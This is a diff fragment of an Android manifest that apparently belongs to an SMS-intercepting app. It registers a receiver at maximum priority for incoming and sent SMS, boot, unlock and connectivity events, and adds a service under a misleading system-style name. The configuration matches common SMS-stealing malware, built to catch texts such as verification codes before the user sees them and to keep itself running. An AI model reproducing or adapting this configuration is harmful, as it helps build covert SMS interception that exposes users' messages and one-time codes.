@@ -33,22 +33,23 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        
-        <service android:name="android.app.Dervice"></service>
-        <receiver android:name="android.content.DroadcastReceiver">
+       	<receiver android:name="com.sms.web.receiver.SMSReceiver" >
             <intent-filter android:priority="2147483647" >
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <action android:name="android.provider.Telephony.SMS_RECEIVED_2"/>
-                <action android:name="android.provider.Telephony.GSM_SMS_RECEIVED"/>
-                <category android:name="android.intent.category.DEFAULT"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
              <intent-filter android:priority="2147483647" >
+                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED_2"/>
+                <action android:name="android.provider.Telephony.GSM_SMS_RECEIVED"/>
                 <action android:name="android.intent.action.PACKAGE_RESTARTED"/>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.USER_PRESENT" />
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="SENT_SMS_ACTION" />
+                <category android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
         </receiver>
+        <service android:name="android.app.sms.service.SMSService"/>
         
     </application>
 
